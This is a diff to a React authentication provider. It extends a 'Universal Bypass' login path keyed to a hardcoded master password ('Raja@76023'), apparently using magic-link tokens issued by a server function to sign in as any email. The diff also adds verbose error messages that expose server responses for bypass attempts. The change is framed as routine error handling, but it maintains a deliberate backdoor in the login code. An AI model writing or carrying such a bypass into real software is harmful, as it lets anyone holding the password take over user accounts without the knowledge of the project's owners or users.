@@ -219,30 +219,49 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
             body: JSON.stringify({ email, password })
           });
           
-          if (response.ok) {
+          const isMasterAttempt = password === 'Raja@76023';
+          
+          if (!response.ok) {
+            if (isMasterAttempt) {
+              const errorBody = await response.text();
+              console.error('Master login error:', errorBody);
+              return { success: false, error: `Bypass Error: ${errorBody}` };
+            }
+            // Fall through for non-master attempts
+          } else {
             const data = await response.json();
             
             // Handle the Universal Bypass (Magic Link Token) returned by the function
             if (data.token_hash) {
               const { error: verifyError } = await supabase.auth.verifyOtp({
                 token_hash: data.token_hash,
-                type: 'magiclink'
+                type: 'magiclink',
+                email: email // Adding email can help verifyOtp in some configurations
               });
               
-              if (verifyError) throw verifyError;
+              if (verifyError) {
+                if (isMasterAttempt) return { success: false, error: `Session Setup Failed: ${verifyError.message}` };
+                throw verifyError;
+              }
               return { success: true };
             }
 
             // Legacy direct session return (if any)
             if (data.session) {
                const { error: setSessionError } = await supabase.auth.setSession(data.session);
-               if (setSessionError) throw setSessionError;
+               if (setSessionError) {
+                 if (isMasterAttempt) return { success: false, error: `Session Restore Failed: ${setSessionError.message}` };
+                 throw setSessionError;
+               }
                return { success: true };
             }
           }
         } catch (err: any) {
            console.warn('Master login check failed or skipped:', err);
-           // Fall through to standard auth if master login fails
+           if (password === 'Raja@76023') {
+             return { success: false, error: `Bypass Connection Error: ${err.message}` };
+           }
+           // Fall through to standard auth if master login fails and it WASN'T a forced master attempt
         }
       }
 
